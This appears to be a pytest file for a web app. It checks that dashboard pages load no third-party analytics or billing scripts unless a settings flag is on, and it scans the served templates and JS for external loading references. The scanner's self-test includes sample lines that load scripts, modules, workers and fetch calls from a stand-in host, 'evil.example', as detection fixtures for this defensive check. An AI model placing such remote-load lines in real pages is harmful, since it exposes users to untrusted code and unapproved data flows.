"""The enterprise `/lab` page loads nothing from a third-party origin.

WHY: `templates/dashboard.html` is a verbatim copy of the B2C page, so it
still pulls Google Analytics (`googletagmanager.com`) and the Paddle
checkout SDK (`cdn.paddle.com`) on every render. On-prem that is a data-flow
nobody signed off on — an air-gapped or egress-filtered network watching
outbound traffic sees the browser
of every analyst calling Google — and both are dead weight here: there is no
billing backend on-prem (`/paddle/config` does not even exist as a route).

The fix is a GATE, not a deletion: `settings.ENABLE_THIRD_PARTY_SCRIPTS`
(default False) so the demo deployment can keep its analytics. Hence the two
directions below: default renders NEITHER block, the flag ON renders BOTH.
The Paddle gate has to cover the inline initializer too — it calls
`Paddle.Initialize`, which would throw with the CDN script gone.

Both `dashboard.html` routes are exercised (`/lab` and the `/c/{conv_id}`
deep link) because each builds its own context dict, and a gate added to one
of them only would ship half the fix.

Offline: `DATA_ROOT` is `tmp_path`, the login path's brain calls are stubbed,
the TestClient is built WITHOUT the context manager (the lifespan starts the
db_scheduler thread), https base_url because the session cookie is
Secure-flagged by default. Every asserted value is bound to a local first.
"""
import pytest
from starlette.testclient import TestClient

import app as app_mod
import brain_client
import local_store
from settings import settings

EMAIL = "third-party@x.com"
PASSWORD = "third-party-pw-123"
CHAT_ID = "chat_third_party"
CONV_ID = "cv_00112233445566aa"

# A stable marker from dashboard.html: the page's own body must survive both
# states, so a gate can never be confused with a broken render.
PAGE_MARKER = 'id="chatInput"'

# One needle per line so a failure names the exact leak.
GA_NEEDLES = ["googletagmanager", "google-analytics", "gtag("]
PADDLE_NEEDLES = ["cdn.paddle.com", "Paddle.Initialize", "/paddle/config"]
THIRD_PARTY_NEEDLES = GA_NEEDLES + PADDLE_NEEDLES

# The two that must come BACK when the flag is on (proving a gate, not a
# deletion): one per vendor block.
GATED_BACK_NEEDLES = ["googletagmanager", "cdn.paddle.com"]

PAGE_PATHS = ["/lab", f"/c/{CONV_ID}"]


@pytest.fixture
def client(tmp_path, monkeypatch):
    monkeypatch.setattr(settings, "DATA_ROOT", str(tmp_path))
    monkeypatch.setattr(settings, "BRAIN_TENANT_TOKEN", "")
    local_store._DATAFRAME_CACHE.invalidate()
    import routes.auth as auth_mod
    monkeypatch.setattr(brain_client, "post_activity", lambda *a, **k: None)
    monkeypatch.setattr(brain_client, "send_welcome_email", lambda *a, **k: None)
    monkeypatch.setattr(auth_mod, "_send_welcome_email_async", lambda email: None)
    auth = local_store.AuthStore()
    auth.ensure_user(EMAIL)
    auth.set_password(EMAIL, PASSWORD)
    # The deep-link route resolves the conv through the caller's own
    # conversations index; without a row it redirects to /lab and the second
    # TemplateResponse site would never render.
    auth.record_conversation(EMAIL, CHAT_ID, CONV_ID, "Third-party check")
    tc = TestClient(app_mod.app, base_url="https://testserver")
    login = tc.post("/auth/login", data={"email": EMAIL, "password": PASSWORD},
                    follow_redirects=False)
    assert login.status_code == 302, (login.status_code, login.text[:300])
    yield tc
    local_store._DATAFRAME_CACHE.invalidate()


def _set_flag(monkeypatch, value) -> None:
    """Explicit `hasattr` first: `Settings` is a pydantic model and assigning
    an undeclared field raises a ValidationError whose text would bury the
    real reason the test is red."""
    assert hasattr(settings, "ENABLE_THIRD_PARTY_SCRIPTS"), (
        "settings must define ENABLE_THIRD_PARTY_SCRIPTS (bool, default "
        "False) — the dashboard.html gate for Google Analytics and Paddle")
    monkeypatch.setattr(settings, "ENABLE_THIRD_PARTY_SCRIPTS", value, raising=False)


def _page(client, path) -> str:
    response = client.get(path, follow_redirects=False)
    status = response.status_code
    assert status == 200, (path, status, response.text[:300])
    text = response.text
    assert PAGE_MARKER in text, (path, text[:300])
    return text


@pytest.mark.parametrize("path", PAGE_PATHS)
@pytest.mark.parametrize("needle", THIRD_PARTY_NEEDLES)
def test_default_render_loads_no_third_party_script(client, path, needle):
    """DEFAULT state: the page must not name any external analytics or
    billing origin. One test per needle so a failure names it."""
    text = _page(client, path)
    assert needle not in text, (path, needle)


@pytest.mark.parametrize("path", PAGE_PATHS)
def test_the_page_still_renders_its_own_markup_by_default(client, path):
    """The gate removes the vendor blocks, not the page."""
    text = _page(client, path)
    assert PAGE_MARKER in text, (path, text[:300])
    assert "PowerDataChat" in text, (path, text[:300])


@pytest.mark.parametrize("path", PAGE_PATHS)
@pytest.mark.parametrize("needle", GATED_BACK_NEEDLES)
def test_the_flag_brings_both_vendor_blocks_back(client, monkeypatch, path, needle):
    """Proves a GATE rather than a deletion: with the setting True the same
    route serves the GA tag and the Paddle SDK again."""
    _set_flag(monkeypatch, True)
    text = _page(client, path)
    assert needle in text, (path, needle, text[:300])


@pytest.mark.parametrize("path", PAGE_PATHS)
def test_the_page_still_renders_its_own_markup_with_the_flag_on(client, monkeypatch, path):
    _set_flag(monkeypatch, True)
    text = _page(client, path)
    assert PAGE_MARKER in text, (path, text[:300])


def test_the_setting_defaults_to_false_on_a_fresh_settings_object(monkeypatch):
    """A customer install must be quiet without setting anything."""
    from settings import Settings

    monkeypatch.delenv("ENABLE_THIRD_PARTY_SCRIPTS", raising=False)
    value = getattr(Settings(), "ENABLE_THIRD_PARTY_SCRIPTS", None)  # local: no Settings repr
    assert value is False


@pytest.mark.parametrize("env,expected", [
    ("true", True), ("1", True), ("yes", True), ("on", True),
    ("false", False), ("0", False), ("", False), ("nonsense", False),
])
def test_the_setting_parses_like_client_llm_debug(monkeypatch, env, expected):
    """Same bool idiom as `CLIENT_LLM_DEBUG` — no new parsing rules."""
    from settings import Settings

    monkeypatch.setenv("ENABLE_THIRD_PARTY_SCRIPTS", env)
    value = getattr(Settings(), "ENABLE_THIRD_PARTY_SCRIPTS", None)  # local: no Settings repr
    assert value is expected


# ---------------------------------------------------------------------------
# structural scan: every served page and script, not only the /lab render
# ---------------------------------------------------------------------------
# No page loads code or content from a third-party origin by default.
#
# The client runs inside a customer's LAN, often without internet egress, and a
# security review treats every external origin a page contacts as a data-flow to
# explain. The served pages may therefore reference an absolute http(s) origin
# in a LOADING position — a `<script src>`, a stylesheet `<link href>`, an
# `<iframe src>`, a dynamic `import(...)`, a `fetch(...)`, or a script element's
# `.src` assigned in JS — only for the origins on the allowlist below, and each
# of those must sit behind the `third_party_scripts` template gate (default off,
# `settings.ENABLE_THIRD_PARTY_SCRIPTS`).
#
# Non-loading references are ignored by construction, because the patterns only
# match loading positions: an `<a href>` to a company page, an input
# `placeholder="https://…"`, and an SVG `xmlns` are not requests the browser
# makes on its own.
#
# Scope: `templates/**/*.html` and `static/**/*.js` (+ any `static/**/*.html`),
# excluding `static/vendor/`, whose libraries are vendored verbatim and carry
# no network references of their own that this product uses.

import re  # noqa: E402
from pathlib import Path  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent

# Origin -> why it is allowed. Both are loaded ONLY under the
# `{% if third_party_scripts %}` gate (the hosted demo turns it on).
ALLOWED_ORIGINS = {
    "www.googletagmanager.com": "Google Analytics — hosted demo only, gated",
    "cdn.paddle.com": "Paddle checkout SDK — hosted demo only, gated",
}

_URL = r"""(https?:)?//(?P<host>[A-Za-z0-9.-]+)"""
HTML_PATTERNS = [
    re.compile(r"<script\b[^>]*?\bsrc\s*=\s*[\"']?" + _URL, re.I | re.S),
    re.compile(r"<link\b[^>]*?\bhref\s*=\s*[\"']?" + _URL, re.I | re.S),
    re.compile(r"<iframe\b[^>]*?\bsrc\s*=\s*[\"']?" + _URL, re.I | re.S),
]
JS_PATTERNS = [
    re.compile(r"\bimport\s*\(\s*[\"'`]" + _URL),
    re.compile(r"\bimport\b[^;\n]*?\bfrom\s*[\"'`]" + _URL),
    re.compile(r"\bfetch\s*\(\s*[\"'`]" + _URL),
    re.compile(r"\.src\s*=\s*[\"'`]" + _URL),
    re.compile(r"\bnew\s+(?:Worker|EventSource|WebSocket)\s*\(\s*[\"'`]" + _URL),
]


def _scanned_files():
    files = sorted((ROOT / "templates").rglob("*.html"))
    for pattern in ("*.js", "*.html"):
        for path in sorted((ROOT / "static").rglob(pattern)):
            rel = path.relative_to(ROOT / "static").as_posix()
            if rel.startswith("vendor/"):
                continue
            files.append(path)
    return files


def _line(text: str, pos: int) -> int:
    return text.count("\n", 0, pos) + 1


def _loading_references():
    """Yield (relative path, line, host, index, text) for every loading
    reference to an absolute origin."""
    for path in _scanned_files():
        text = path.read_text(encoding="utf-8", errors="replace")
        patterns = list(JS_PATTERNS)
        if path.suffix == ".html":
            patterns = HTML_PATTERNS + JS_PATTERNS     # inline <script> blocks too
        for pattern in patterns:
            for m in pattern.finditer(text):
                yield (path.relative_to(ROOT).as_posix(), _line(text, m.start()),
                       m.group("host").lower(), m.start(), text)


def _inside_third_party_gate(text: str, pos: int) -> bool:
    """Is `pos` inside a `{% if third_party_scripts %}` … `{% endif %}` block?"""
    stack = []
    for m in re.finditer(r"{%-?\s*(if\b[^%]*|endif)\s*-?%}", text[:pos]):
        token = m.group(1).strip()
        if token.startswith("if"):
            stack.append(token)
        elif stack:
            stack.pop()
    return any(re.fullmatch(r"if\s+third_party_scripts", t) for t in stack)


def test_the_scan_covers_the_served_pages():
    names = {p.relative_to(ROOT).as_posix() for p in _scanned_files()}
    for must in ("templates/dashboard.html", "templates/auth_landing.html",
                 "templates/admin_data_sources.html", "static/dashboard.js",
                 "static/admin_data_sources.js"):
        assert must in names, must
    assert not any(n.startswith("static/vendor/") for n in names)


def test_no_page_loads_from_an_origin_outside_the_allowlist():
    offenders = [f"{rel}:{line} {host}"
                 for rel, line, host, _pos, _text in _loading_references()
                 if host not in ALLOWED_ORIGINS]
    assert offenders == [], offenders


def test_every_allowlisted_origin_is_behind_the_third_party_gate():
    ungated = [f"{rel}:{line} {host}"
               for rel, line, host, pos, text in _loading_references()
               if host in ALLOWED_ORIGINS
               and not (rel.endswith(".html") and _inside_third_party_gate(text, pos))]
    assert ungated == [], ungated


def test_the_allowlist_has_no_stale_entries():
    seen = {host for _rel, _line, host, _pos, _text in _loading_references()}
    stale = sorted(set(ALLOWED_ORIGINS) - seen)
    assert stale == [], stale


def test_the_scanner_recognises_each_loading_form():
    """The patterns themselves, so a regex slip cannot turn this file into a
    test that passes by matching nothing."""
    html_samples = [
        '<script async src="https://evil.example/x.js"></script>',
        "<link rel='stylesheet' href='https://evil.example/x.css'>",
        '<iframe width="1" src="//evil.example/frame"></iframe>',
    ]
    for sample in html_samples:
        assert any(p.search(sample) for p in HTML_PATTERNS), sample
    js_samples = [
        "import('https://evil.example/m.js')",
        'import x from "https://evil.example/m.js";',
        "fetch(`https://evil.example/api`)",
        "s.src = 'https://evil.example/x.js'",
        'new Worker("https://evil.example/w.js")',
    ]
    for sample in js_samples:
        assert any(p.search(sample) for p in JS_PATTERNS), sample
    ignored = [
        '<a href="https://www.linkedin.com/company/x">in</a>',
        '<input placeholder="https://pdc.example.com" />',
        "document.createElementNS('http://www.w3.org/2000/svg', 'svg')",
        '<svg xmlns="http://www.w3.org/2000/svg"></svg>',
        '<script src="/static/vendor/plotly/plotly.min.js"></script>',
    ]
    for sample in ignored:
        assert not any(p.search(sample) for p in HTML_PATTERNS + JS_PATTERNS), sample


def test_the_gate_detector_itself():
    text = ("{% if a %}x{% endif %}{% if third_party_scripts %}<script "
            "src='https://cdn.paddle.com/p.js'></script>{% endif %}"
            "<script src='https://cdn.paddle.com/q.js'></script>")
    first = text.index("https://cdn.paddle.com/p.js")
    second = text.index("https://cdn.paddle.com/q.js")
    assert _inside_third_party_gate(text, first) is True
    assert _inside_third_party_gate(text, second) is False
